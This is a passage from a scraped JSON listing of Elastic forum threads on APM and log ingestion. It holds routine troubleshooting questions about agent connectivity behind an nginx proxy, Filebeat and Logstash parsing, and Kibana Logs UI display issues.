    "url": "https://discuss.elastic.co/t/sql-spans-with-db2-jdbc-4/207319",
    "title": "SQL Spans with DB2 (JDBC 4)",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "November 11, 2019, 9:54am November 12, 2019, 10:12am November 25, 2019, 12:57pm December 16, 2019, 8:57am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "cc725155-fed2-471b-9cdf-e6309dadedd6",
    "url": "https://discuss.elastic.co/t/monitoring-docker-application/209196",
    "title": "Monitoring Docker application",
    "category": [
      "APM"
    ],
    "author": "gopikrishnan",
    "date": "November 24, 2019, 7:17pm November 25, 2019, 1:16am December 15, 2019, 9:16pm",
    "body": "Hi Team, Kindly help me to understand whether elastic APM is capable of monitoring Docker application running on Linux machine and if yes then how to instrument it. Thanks, Gopikrishnan",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "fc6317ab-992b-439a-92fa-15977b05db5d",
    "url": "https://discuss.elastic.co/t/apm-agent-cannot-connect-to-remote-apm-server/209117",
    "title": "Apm agent cannot connect to remote apm server",
    "category": [
      "APM"
    ],
    "author": "he11oworld",
    "date": "November 22, 2019, 7:39pm November 24, 2019, 7:49am December 15, 2019, 3:49am",
    "body": "Kibana version: 7.4.0 Elasticsearch version: 7.4.0 APM Server version: 7.4.0 APM Agent language and version: Java, 1.11.0 Is there anything special in your setup? For example, are you using the Logstash or Kafka outputs? Are you using a load balancer in front of the APM Servers? Have you changed index pattern, generated custom templates, changed agent configuration etc. my apm-server is on Kubernetes, and has nginx-proxy in front. Description of the problem including expected versus actual behavior. Please include screenshots (if relevant): The elastic-apm-agent and the java application reside on my local system, I am able to send logs when I run kubectl port forward apm-server 8200 but I get 502 status when I specify nginx-proxy loadbalancer url in elasticapm.properties file. Provide logs and/or server output (if relevant): my elasticapm.properties file looks like this: service_name=demo application_packages=ca.com.elastic server_urls=https://172.20.11.188 verify_server_cert=false log_level=debug apm-server.yaml file: apm-server.yml: | host: \"0.0.0.0:8200\" setup.template.settings: index: number_of_shards: 1 codec: best_compression setup.kibana: host: \"< kibana endpoint >\" output.elasticsearch: hosts: [\"elasticsearch:9200\"] logs from elastic-apm-agent: 2019-11-22 11:25:03.188 [apm-reporter] DEBUG co.elastic.apm.agent.report.IntakeV2ReportingEventHandler - Starting new request to https://172.20.11.188/intake/v2/events 2019-11-22 11:25:03.224 [apm-reporter] DEBUG co.elastic.apm.agent.report.IntakeV2ReportingEventHandler - Scheduling request timeout in 10s 2019-11-22 11:25:13.225 [apm-request-timeout-timer] DEBUG co.elastic.apm.agent.report.IntakeV2ReportingEventHandler - Request flush because the request timeout occurred 2019-11-22 11:25:13.235 [apm-reporter] DEBUG co.elastic.apm.agent.report.IntakeV2ReportingEventHandler - Receiving FLUSH event (sequence 1) 2019-11-22 11:25:13.238 [apm-reporter] DEBUG co.elastic.apm.agent.report.IntakeV2ReportingEventHandler - Flushing 1386 uncompressed 601 compressed bytes 2019-11-22 11:25:13.240 [apm-reporter] INFO co.elastic.apm.agent.report.IntakeV2ReportingEventHandler - Backing off for 0 seconds (+/-10%) 2019-11-22 11:25:13.240 [apm-reporter] ERROR co.elastic.apm.agent.report.IntakeV2ReportingEventHandler - Error sending data to APM server: Server returned HTTP response code: 502 for URL: https://172.20.11.188/intake/v2/events, response code is 502 2019-11-22 11:25:13.240 [apm-reporter] DEBUG co.elastic.apm.agent.report.IntakeV2ReportingEventHandler - Sending payload to APM server failed java.io.IOException: Server returned HTTP response code: 502 for URL: https://172.20.11.188/intake/v2/events at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1894) at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1492) at sun.net.www.protocol.https.HttpsURLConnectionImpl.getInputStream(HttpsURLConnectionImpl.java:263) at co.elastic.apm.agent.report.IntakeV2ReportingEventHandler.flush(IntakeV2ReportingEventHandler.java:224) at co.elastic.apm.agent.report.IntakeV2ReportingEventHandler.handleEvent(IntakeV2ReportingEventHandler.java:128) at co.elastic.apm.agent.report.IntakeV2ReportingEventHandler.onEvent(IntakeV2ReportingEventHandler.java:116) at co.elastic.apm.agent.report.IntakeV2ReportingEventHandler.onEvent(IntakeV2ReportingEventHandler.java:50) at co.elastic.apm.agent.shaded.lmax.disruptor.BatchEventProcessor.processEvents(BatchEventProcessor.java:168) at co.elastic.apm.agent.shaded.lmax.disruptor.BatchEventProcessor.run(BatchEventProcessor.java:125) at java.lang.Thread.run(Thread.java:748) 2019-11-22 11:25:13.243 [apm-reporter] WARN co.elastic.apm.agent.report.IntakeV2ReportingEventHandler - 502 Bad Gateway 502 Bad Gateway nginx/1.13.12 Logs from nginx proxy pod: 2019/11/22 19:24:35 [error] 10#10: *309 connect() failed (111: Connection refused) while connecting to upstream, client: 10.20.6.1, server: , request: \"POST /config/v1/agents HTTP/1.1\", upstream: \"http://10.19.72.106:8200/config/v1/agents\", host: \"172.20.11.188\" 10.20.6.1 - - [22/Nov/2019:19:24:35 +0000] \"POST /config/v1/agents HTTP/1.1\" 502 174 \"-\" \"elasticapm-java/1.11.0\" \"-\" 2019/11/22 19:24:44 [info] 10#10: *309 client 10.20.6.1 closed keepalive connection 2019/11/22 19:25:43 [error] 10#10: *311 connect() failed (111: Connection refused) while connecting to upstream, client: 10.20.6.1, server: , request: \"POST /intake/v2/events HTTP/1.1\", upstream: \"http://10.19.72.106:8200/intake/v2/events\", host: \"172.20.11.188\" 10.20.6.1 - - [22/Nov/2019:19:25:43 +0000] \"POST /intake/v2/events HTTP/1.1\" 502 174 \"-\" \"elasticapm-java/1.11.0\" \"-\" 2019/11/22 19:25:49 [info] 10#10: *311 client 10.20.6.1 closed keepalive connection 2019/11/22 19:26:13 [error] 10#10: *313 connect() failed (111: Connection refused) while connecting to upstream, client: 10.20.6.1, server: , request: \"POST /intake/v2/events HTTP/1.1\", upstream: \"http://10.19.72.106:8200/intake/v2/events\", host: \"172.20.11.188\" 10.20.6.1 - - [22/Nov/2019:19:26:13 +0000] \"POST /intake/v2/events HTTP/1.1\" 502 174 \"-\" \"elasticapm-java/1.11.0\" \"-\" 2019/11/22 19:26:26 [info] 10#10: *313 client 10.20.6.1 closed keepalive connection 10.20.6.1 - - [22/Nov/2019:19:27:13 +0000] \"POST /intake/v2/events HTTP/1.1\" 502 174 \"-\" \"elasticapm-java/1.11.0\" \"-\" 2019/11/22 19:27:13 [error] 10#10: *315 connect() failed (111: Connection refused) while connecting to upstream, client: 10.20.6.1, server: , request: \"POST /intake/v2/events HTTP/1.1\", upstream: \"http://10.19.72.106:8200/intake/v2/events\", host: \"172.20.11.188\" 2019/11/22 19:27:33 [info] 10#10: *315 client 10.20.6.1 closed keepalive connection 2019/11/22 19:27:43 [error] 10#10: *317 connect() failed (111: Connection refused) while connecting to upstream, client: 10.20.6.1, server: , request: \"POST /intake/v2/events HTTP/1.1\", upstream: \"http://10.19.72.106:8200/intake/v2/events\", host: \"172.20.11.188\" Any ideas?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "14b948a2-57d3-4874-a684-95c4d2fc07aa",
    "url": "https://discuss.elastic.co/t/apm-server-logs/208998",
    "title": "Apm-server logs",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "November 22, 2019, 3:03am November 22, 2019, 11:39am November 22, 2019, 4:56pm November 22, 2019, 11:01pm December 13, 2019, 7:01pm",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "76cc2899-4df3-4878-a769-c0ba5950705f",
    "url": "https://discuss.elastic.co/t/apm-dashboard-transaction-overview-bug/208899",
    "title": "APM dashboard transaction overview bug?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "November 22, 2019, 7:28pm November 25, 2019, 3:55pm December 20, 2019, 7:58pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "a7697af0-4295-4e0d-9216-8985996eafe9",
    "url": "https://discuss.elastic.co/t/nodejs-apm-does-not-report-postgres-queries/208984",
    "title": "NodeJS APM does not report postgres queries",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "November 21, 2019, 10:05pm November 22, 2019, 3:54am November 22, 2019, 3:54am November 22, 2019, 5:19am December 13, 2019, 1:23am",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "88d12820-02bc-40ba-ac34-8c67751e4312",
    "url": "https://discuss.elastic.co/t/span-start-using-withstarttimestamp-long-micro/208992",
    "title": "Span start using withStartTimestamp(Long micro)",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "November 22, 2019, 6:19am November 22, 2019, 4:43am December 12, 2019, 9:56pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "a9dbb5c1-f78f-4d9d-8b8c-64841df803ea",
    "url": "https://discuss.elastic.co/t/creating-spans-using-elastic-apm-bridge/208614",
    "title": "Creating spans using Elastic APM bridge",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "November 20, 2019, 3:48pm November 20, 2019, 3:41pm November 20, 2019, 5:11pm November 21, 2019, 8:24pm December 12, 2019, 4:22am",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "a69076e5-b8e6-44dc-af53-78694681930b",
    "url": "https://discuss.elastic.co/t/can-apm-monitor-what-user-actions-in-the-web-page/205516",
    "title": "Can APM monitor what user actions in the web page?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "November 21, 2019, 12:44am October 30, 2019, 6:33pm October 30, 2019, 7:03pm October 31, 2019, 2:24am November 14, 2019, 5:47pm November 14, 2019, 5:59pm November 19, 2019, 9:16am November 21, 2019, 12:43am November 21, 2019, 8:09am November 21, 2019, 10:20pm November 21, 2019, 10:37pm December 12, 2019, 6:37pm",
    "body": "",
    "website_area": "discuss",
    "replies": 12
  },
  {
    "id": "6c895bfe-3e72-42b5-a811-82d28e680a63",
    "url": "https://discuss.elastic.co/t/about-the-logs-category/156755",
    "title": "About the Logs category",
    "category": [
      "Logs"
    ],
    "author": "warkolm",
    "date": "November 14, 2018, 10:48pm",
    "body": "Everything related to the Logs app – setup with Filebeat, Filebeat modules, and using the Kibana Logs app.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "4785b25e-018b-4ddd-9155-af633dbf1f88",
    "url": "https://discuss.elastic.co/t/aix-or-solaris-logs-to-kafka/228725",
    "title": "AIX or Solaris logs to Kafka",
    "category": [
      "Logs"
    ],
    "author": "sunilmchaudhari",
    "date": "April 19, 2020, 11:48am April 19, 2020, 11:17pm",
    "body": "Hi, I want to ship logs to kafka from AIX/Solaris clients? Any good beat/shipper apart from logstash or LSF ? I need something which can send logs to Kafka brokers in load balancing, over SSL. Please help in this regardd. thanks Sunil.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "bd1d4312-456d-4430-81d3-0eef60250488",
    "url": "https://discuss.elastic.co/t/logs-rest-api/226068",
    "title": "Logs REST API",
    "category": [
      "Logs"
    ],
    "author": "Dawood",
    "date": "April 1, 2020, 2:45pm April 1, 2020, 2:56pm April 1, 2020, 2:58pm April 1, 2020, 2:59pm April 1, 2020, 3:00pm April 1, 2020, 3:20pm April 6, 2020, 2:47pm April 15, 2020, 10:02am",
    "body": "Hi, Is there a REST API to retrieve all logs(hits) by specific search ? Is there any examples? In elastic section i can not see that!! Thanks, Dawood",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "c4c1a40c-8c5a-44b1-82a7-9283a78ee60a",
    "url": "https://discuss.elastic.co/t/kibana-infra-logs-displaying-undefined-for-ecs-formatted-events/226137",
    "title": "Kibana infra/logs displaying \"undefined\" for ECS-formatted events",
    "category": [
      "Logs"
    ],
    "author": "ceekay",
    "date": "April 2, 2020, 6:02pm April 2, 2020, 6:19pm April 3, 2020, 2:58am April 3, 2020, 9:58am April 3, 2020, 2:43pm April 14, 2020, 4:01pm",
    "body": "I've spent quite a while reworking my apache/nginx Logstash filter to be ECS-compliant, mostly using the url and http field sets. The newly-formated events are indexing correctly and look fine in Kibana Discover, but in the Infra/Logs interface most of the message field displays \"undefined\". E.g., pre-ECS: 11:26:48.752 127.0.0.1 - - [01/Apr/2020:22:26:48 +0000] \"get /something\" 400 173 \"-\" \"-\" \"-\" Event: https://gist.github.com/ceeeekay/2c036cf67d782b0b036e8379e9b91927 ECS-formatted: 10:40:46.582 [undefined][access] undefined undefined \"GET /?undefined HTTP/undefined\" 200 undefined Event: https://gist.github.com/ceeeekay/79706bc726ff2b071c9f918a165b4499. I'm really not sure what's going on here. I assumed the logs interface would just display the message field but it seems to be trying to parse some other fields in the event. The settings in the Logs interface are pretty standard. Just a customised index name (which it can read fine) and some columns. The only thing of note is that this is in a particular user's space, but it's the only place we currently have http events. How do I fix this, and continue using ECS fields for my events? At the moment I've had to roll back to my old filters which doesn't bode well for converting the rest of my pipeline to ECS. Thanks!",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "ef27a4d5-ed55-4f32-ae19-945038974999",
    "url": "https://discuss.elastic.co/t/error-has-occured-trying-to-edit-kibana-logs-ui-default-default-log-entry-categories-count-ml-job-model-memory-limit/224264",
    "title": "Error has occured trying to edit kibana-logs-ui-default-default-log-entry-categories-count ml job model memory limit",
    "category": [
      "Logs"
    ],
    "author": "willemdh",
    "date": "March 19, 2020, 12:41pm March 19, 2020, 1:37pm March 19, 2020, 3:28pm March 19, 2020, 9:29pm April 1, 2020, 1:45pm April 1, 2020, 5:08pm April 1, 2020, 7:15pm April 1, 2020, 7:32pm April 1, 2020, 7:50pm April 3, 2020, 1:44pm April 4, 2020, 3:06pm April 6, 2020, 10:18am April 6, 2020, 1:40pm April 7, 2020, 10:00am April 7, 2020, 7:16pm April 8, 2020, 9:51am April 8, 2020, 11:33am April 8, 2020, 4:44pm April 9, 2020, 6:45am",
    "body": "Hello, It seems I hit hard limit for the memory ml model of 'kibana-logs-ui-default-default-log-entry-categories-count' image1839×91 18 KB So I stopped the datafeed, closed the job, edit the job and try to edit the Model memory limit from 512mb to 1024mb, but I get 2 errors: image693×286 15.3 KB Bug? Sth else? Grtz Willem",
    "website_area": "discuss",
    "replies": 19
  },
  {
    "id": "f018b572-15c5-4855-bb4b-bf81a3aff5bd",
    "url": "https://discuss.elastic.co/t/logtrail-performance/225989",
    "title": "Logtrail performance",
    "category": [
      "Logs"
    ],
    "author": "Dawood",
    "date": "April 1, 2020, 7:22am April 1, 2020, 9:11am April 1, 2020, 11:35am",
    "body": "I have a question regarding Logtrail plugin in kibana. I am sending structured data from python using AsynchronousLogstashHandler: handler = AsynchronousLogstashHandler(host=self.logstash_host, port=5045, database_path=None, transport='logstash_async.transport.UdpTransport') handler.setFormatter(LogstashFormatter(tags=self.extra, extra=self.extra)) handler.setLevel(logging.NOTSET) self.addHandler(handler) logstash conf file configured correctly in rancher and logtrail json is the same as in github: github.com sivasamyk/logtrail/blob/master/logtrail.json { \"version\" : 2, \"index_patterns\" : [ { \"es\": { \"default_index\": \"kibana_sample_data_logs\" }, \"tail_interval_in_seconds\": 10, \"es_index_time_offset_in_seconds\": 0, \"display_timezone\": \"local\", \"display_timestamp_format\": \"MMM DD HH:mm:ss\", \"max_buckets\": 500, \"default_time_range_in_days\" : 0, \"max_hosts\": 100, \"max_events_to_keep_in_viewer\": 5000, \"default_search\": \"\", \"fields\" : { \"mapping\" : { \"timestamp\" : \"@timestamp\", \"hostname\" : \"host\", This file has been truncated. show original I can see the messages in a good format,However, they displayed as a bulk and not similar as an output of the console ( Not exactly real time) . My question is : Is there something should i configured maybe in the index, kibana, or logstash that can change the behaviour ? Thanks, Dawood",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "07037a88-656d-4c1e-a699-5b72c911dfa7",
    "url": "https://discuss.elastic.co/t/configuring-the-default-columns-to-appear-in-the-log-stream-view/225497",
    "title": "Configuring the default columns to appear in the log stream view",
    "category": [
      "Logs"
    ],
    "author": "",
    "date": "March 29, 2020, 9:08am March 30, 2020, 9:21am March 30, 2020, 9:56am March 30, 2020, 10:35am March 30, 2020, 10:40am",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "0d85dd50-2117-483c-a118-fa1ce93b514d",
    "url": "https://discuss.elastic.co/t/when-are-you-planning-to-release-v0-1-4/224225",
    "title": "When are you planning to release v0.1.4?",
    "category": [
      "Logs"
    ],
    "author": "Bingu_Shim",
    "date": "March 19, 2020, 7:45am March 23, 2020, 3:26pm April 16, 2020, 2:30pm",
    "body": "Hello, I'm trying to apply ECS formatted logging using ECS Logging Java Libary to Spring Boot project with logback. It works well, but I want to add few custom fields, in order to filter out and make trend graph. I checked this feature is already developed HERE and waiting for release. Could you let me know any timeframe of the next release of it that would be 0.1.4. thank you github.com elastic/ecs-logging-java/blob/master/logback-ecs-encoder/README.md#encoder-parameters # ECS Logback Encoder ## Step 1: add dependency Latest version: [![Maven Central](https://img.shields.io/maven-central/v/co.elastic.logging/logback-ecs-encoder.svg)](https://search.maven.org/search?q=g:co.elastic.logging%20AND%20a:logback-ecs-encoder) Add a dependency to your application ```xml <dependency> <groupId>co.elastic.logging</groupId> <artifactId>logback-ecs-encoder</artifactId> <version>${ecs-logging-java.version}</version> </dependency> ``` ## Step 2: use the `EcsEncoder` All you have to do is to use the `co.elastic.logging.logback.EcsEncoder` instead of the default pattern encoder ```xml <encoder class=\"co.elastic.logging.logback.EcsEncoder\"> This file has been truncated. show original",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "1fe00e09-9a22-4f02-97e0-c35ddd21f0b7",
    "url": "https://discuss.elastic.co/t/create-curator-in-elastic-cloud/221768",
    "title": "Create Curator in Elastic Cloud",
    "category": [
      "Logs"
    ],
    "author": "",
    "date": "March 2, 2020, 8:39pm March 2, 2020, 9:02pm March 4, 2020, 8:56pm March 3, 2020, 6:11am March 3, 2020, 6:11am March 4, 2020, 12:41pm March 4, 2020, 3:57pm March 4, 2020, 8:52pm March 4, 2020, 10:29pm March 4, 2020, 10:38pm April 1, 2020, 10:45pm",
    "body": "",
    "website_area": "discuss",
    "replies": 11
  },
  {
    "id": "7fb1ba1c-870f-44a2-a987-34fa816386c6",
    "url": "https://discuss.elastic.co/t/pushing-partly-json-log-to-es-with-filebeat/221208",
    "title": "Pushing partly JSON log to ES with filebeat",
    "category": [
      "Logs"
    ],
    "author": "tuudik",
    "date": "February 27, 2020, 10:23am February 28, 2020, 10:56am February 28, 2020, 10:58am March 27, 2020, 10:58am",
    "body": "Hi! Could someone give me some guidance, how to push audit.log which looks like below to ES? In Elasticsearch I would like to have timestamp which is the first one on the line and then information from JSON part: event, user and data. It would be awesome if the data JSON could be also put as separate fields, but I dont know what are all the possible fields to make index template. 2020-02-19T08:53:29+00:00 ip-10-10-10-5 INFO [Car Rental System] 2020-02-19 08:53:29+0000 - {\"event\":\"Add client\",\"user\":\"bob.johnson\",\"data\":{\"clientName\":\"Coca-Foola\",\"clientType\":\"COM\",\"clientCode\":\"0170743762120\"}} 2020-02-19T09:24:03+00:00 ip-10-10-10-5 INFO [Car Rental System] 2020-02-19 09:24:03+0000 - {\"event\":\"Log out user\",\"user\":\"bob.johnson\"} 2020-02-19T13:51:44+00:00 ip-10-10-10-5 INFO [Car Rental System] 2020-02-19 13:51:44+0000 - {\"event\":\"Log in user failed\"} 2020-02-19T13:51:52+00:00 ip-10-10-10-5 INFO [Car Rental System] 2020-02-19 13:51:52+0000 - {\"event\":\"Log in user\",\"user\":\"bob.johnson\"} 2020-02-19T14:23:15+00:00 ip-10-10-10-5 INFO [Car Rental System] 2020-02-19 14:23:15+0000 - {\"event\":\"Log out user\",\"user\":\"bob.johnson\"} 2020-02-19T14:33:15+00:00 ip-10-10-10-5 INFO [Car Rental System] 2020-02-19 14:33:15+0000 - {\"event\":\"Log in user\",\"user\":\"bob.johnson\"} 2020-02-19T14:33:52+00:00 ip-10-10-10-5 INFO [Car Rental System] 2020-02-19 14:33:52+0000 - {\"event\":\"Register client rental\",\"user\":\"bob.johnson\",\"data\":{\"carCode\":\"fseff232fs\",\"carClass\":\"SUV\",\"licensePlate\":\"0170368015672\",\"rentalInformation\":{\"Make\":\"Toyota\",\"clientType\":\"COM\",\"clientCode\":\"0170743762120\",\"promotionCode\":\"ride-free\"}}} 2020-02-19T14:33:57+00:00 ip-10-10-10-5 INFO [Car Rental System] 2020-02-19 14:33:57+0000 - {\"event\":\"Approve rental\",\"user\":\"bob.johnson\",\"data\":{\"carCode\":\"fseff232fs\"}}",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "749f476a-3350-46e6-88dd-68ddb250f436",
    "url": "https://discuss.elastic.co/t/guid-is-not-a-configured-index-pattern-id-showing-the-default-index-pattern/217405",
    "title": "GUID is not a configured index pattern ID Showing the default index pattern",
    "category": [
      "Logs"
    ],
    "author": "daz1761",
    "date": "January 31, 2020, 3:04pm January 31, 2020, 3:58pm January 31, 2020, 4:06pm February 3, 2020, 8:28am March 2, 2020, 8:29am",
    "body": "I am new to ELK, and I have just spun up the containers including Filebeat via Docker Compose to read some dummy logs from a file (see https://github.com/moryachok/elasticstack-lab). When I go to the Discovery tab in Kibana (Firefox for Mac) after creating an index pattern, I get a notification pop up: \"cba24e50-4422-11ea-87a6-196047a921ba\" is not a configured index pattern ID Showing the default index pattern: \"sample-*\" (7ce7e210-442d-11ea-b280-431f48906f3f) Though all seems to be working, I was wondering why this is happening? Funnily enough I have someone who did the same process on a Linux machine and didn't get the warning. Is this some browser caching issue?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "e716c101-276a-4432-88ea-554259b970cd",
    "url": "https://discuss.elastic.co/t/sending-log4j-logs-in-xml-again/215739",
    "title": "Sending Log4J logs (in XML) again",
    "category": [
      "Logs"
    ],
    "author": "JY_DT",
    "date": "January 20, 2020, 1:15pm January 20, 2020, 3:40pm January 21, 2020, 6:54am January 21, 2020, 8:51am January 21, 2020, 12:27pm January 22, 2020, 1:13pm January 22, 2020, 3:41pm January 23, 2020, 11:25am January 23, 2020, 11:29am January 24, 2020, 10:50am January 24, 2020, 11:29am January 24, 2020, 1:56pm January 27, 2020, 6:39pm January 30, 2020, 12:16pm February 27, 2020, 12:16pm",
    "body": "Hi, This is a follow up to an earlier post on a similar topic. I'm trying to send Log4j logs in XML format to Elasticsearch using Logstash. My XML file is: <log4j:event logger=\"Common.Core.Sessions.SessionManager\" level=\"INFO\" timestamp=\"1567418641859\" thread=\"8\"> <log4j:message> Session fb9d3408-d370 created for user {9131559e-3b0b} at 127.0.0.1:4931</log4j:message> <log4j:properties> <log4j:data name=\"ConnectionId\" value=\"0HLPFHJFNA3PK\" /> <log4j:data name=\"RequestId\" value=\"0HLPFHJFNA3PK:00000007\" /> </log4j:properties> </log4j:event> and logstash.conf file is: input { beats { port => 5044 type => \"log\" } } filter { xml { source => \"message\" xpath => [ \"/log4j:event/log4j:message/text()\", \"messageMES\" ] store_xml => true target => \"doc\" } } output { elasticsearch { hosts => \"localhost:9200\" sniffing => true manage_template => false index => \"%{[@metadata][beat]}-%{+yyyy.ww}\" document_type => \"%{[@metadata][type]}\" } } My Filebeat config (partially) is: filebeat.inputs: - type: log enabled: true paths: - C:\\ProgramData\\LogTest\\*.xml #Multiline options multiline.pattern: '^<log4j:event' multiline.negate: true multiline.match: after The issue is that all the services start correctly and I do not see any errors in any log files, but the message that I've captured from the XML file ( \"Session fb9d3408-d370 created for user {9131559e-3b0b} at 127.0.0.1:4931\" ) does not show up in the Kibana logs. Is there anything wrong in the configs? Or is there something else ? Thanks in advance, Jy",
    "website_area": "discuss",
    "replies": 15
  },
  {
    "id": "4658aa57-b0b7-4b84-b361-11aab8088257",
    "url": "https://discuss.elastic.co/t/unable-to-output-elastalert-log/215477",
    "title": "Unable to output elastalert.log",
    "category": [
      "Logs"
    ],
    "author": "Sansao",
    "date": "January 17, 2020, 2:27pm January 27, 2020, 11:03am February 24, 2020, 11:03am",
    "body": "I need to remove elastalert information from /var/log/messages, and I'm having trouble creating a log file for elastalert. the default configuration in config.yaml doesn't work and i'm not getting it through the /etc/rsyslog.conf rules either any suggestion?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "54d745e3-eb27-40bc-9de0-d949ec5bad01",
    "url": "https://discuss.elastic.co/t/detecting-and-alerting-on-log-loss-from-logstash-or-beats/214482",
    "title": "Detecting and Alerting on Log Loss from Logstash or beats",
    "category": [
      "Logs"
    ],
    "author": "ciphee",
    "date": "January 9, 2020, 7:49pm January 9, 2020, 9:34pm January 10, 2020, 12:11am January 16, 2020, 5:04pm February 13, 2020, 5:04pm",
    "body": "Hello, I was trying to be able to detect/alert when either logstash or a beats product stops sendings logs. The problem in the past we have had is when a specific logstash server goes down, or is up but not sending any logs, we were unaware until we attempted to lookup logs coming from that specific server and did not have any new events coming in. Question: Is there any simple way to alert on a host when it stops sending logs to elastic after 24 hours or so?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "6627e386-c9fd-4f42-8f2e-422f79a0e07c",
    "url": "https://discuss.elastic.co/t/sending-log4j-logs-in-xml-format-to-elasticsearch/214387",
    "title": "Sending Log4j logs ( in XML format) to Elasticsearch",
    "category": [
      "Logs"
    ],
    "author": "JY_DT",
    "date": "January 9, 2020, 9:22am January 9, 2020, 10:21am January 9, 2020, 10:40am January 9, 2020, 10:43am January 16, 2020, 11:35am January 16, 2020, 1:38pm February 13, 2020, 1:34pm",
    "body": "Hello, I need to send log files generated using Log4j on client machines to Elasticsearch installed on a server. The logs are in XML format. Is there any other plugin, etc required, or can it just be done using Filebeat itself? As mentioned here: https://www.elastic.co/guide/en/logstash/current/plugins-inputs-log4j.html \"This plugin is deprecated. It is recommended that you use filebeat to collect logs from log4j.\" So, how do we collect logs from log4j using Filebeat? Thanks, Jy",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "c2a3a4e3-3c4d-4e22-a879-c2105a1457b9",
    "url": "https://discuss.elastic.co/t/message-failed-to-find-message-in-kibana-logs/210522",
    "title": "Message: \"failed to find message\" in Kibana Logs",
    "category": [
      "Logs"
    ],
    "author": "jmteba",
    "date": "December 10, 2019, 9:53am December 10, 2019, 11:03am December 10, 2019, 11:08am January 7, 2020, 11:08am",
    "body": "Hello, We have a problem when we try to see logs from Kibana \"Logs\", so we get this message: \"failed to find message\", failed_to_find_message|690x424 but in this path there are multiple log's files. failed_to_find_message_server|530x121 ! By the other hand, we see this logs in \"Discover\" failed_to_find_message_discover.png1045×414 28.8 KB ! But it seems that there is some wrong in Kibana \"Logs\" I need to do something to achieve get my full logs here? Thanks!",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "306f1804-b08f-43d1-9c4d-b2d3eea4f05b",
    "url": "https://discuss.elastic.co/t/how-to-see-the-surrounding-documents-in-kibana-v7-4-2-log-tab/208834",
    "title": "How to see the surrounding documents in kibana v7.4.2 log tab",
    "category": [
      "Logs"
    ],
    "author": "111244",
    "date": "November 21, 2019, 1:17pm November 21, 2019, 4:28pm November 25, 2019, 8:37am December 23, 2019, 8:43am",
    "body": "how to see the surrounding documents in kibana v7.4.2 log tab? i can't find this link image.png1494×92 17.3 KB",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "1c06ef45-3237-4db8-94e4-491dba440a5f",
    "url": "https://discuss.elastic.co/t/apache-nginx-logs-wrapped-in-syslog-format/207211",
    "title": "Apache/nginx logs wrapped in syslog format",
    "category": [
      "Logs"
    ],
    "author": "w_o_j_t_e_k",
    "date": "November 9, 2019, 12:04pm November 11, 2019, 8:57am November 11, 2019, 10:40am December 9, 2019, 10:40am",
    "body": "Hi, I've got a centralized log server that receives apache + nginx logs. I would like to use filebeat on this box to forward these logs into elastic. The logs are wrapped in the syslog format, e.q: 2019-11-09T11:50:56+00:00 foobar nginx_access: 202.18.3.162 - - [09/Nov/2019:11:50:56 +0000] \"GET / HTTP/1.1\" 301 178 \"-\" \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36\" so first columns are added by rsyslog therefore i can't use apache/nginx filebeat module Obviously I could change rsyslog format to exclude these 3 columns (ts, host, tag) but wondering if it's possible to pre-process on the filebeat level so I can use filebeat modules rather than writting my post processors Regards",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "9bb1a911-95b4-418e-b62d-e40eebafa341",
    "url": "https://discuss.elastic.co/t/logs-in-logstash-archive/205640",
    "title": "Logs in Logstash / archive",
    "category": [
      "Logs"
    ],
    "author": "juuuhuuu",
    "date": "October 29, 2019, 10:29am October 29, 2019, 11:04am October 30, 2019, 11:47am October 30, 2019, 12:24pm October 30, 2019, 12:24pm October 30, 2019, 12:24pm November 27, 2019, 12:24pm",
    "body": "Hello, Im new in elastic. I would like to know, for how long the logs are \"active \" in logstash. Can I archive them, if yes how? Thank you",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "5ffeac55-b5e1-4729-b2e4-d48eae8d68db",
    "url": "https://discuss.elastic.co/t/logsui-in-kibana-7-4-0-getting-error-when-trying-to-look-at-the-logs-with-date-nanos/204335",
    "title": "LogsUI in kibana 7.4.0 getting error when trying to look at the logs with date_nanos",
    "category": [
      "Logs"
    ],
    "author": "Alex-St",
    "date": "October 20, 2019, 6:54am October 21, 2019, 11:33am October 23, 2019, 8:54pm October 23, 2019, 9:55pm November 20, 2019, 9:55pm",
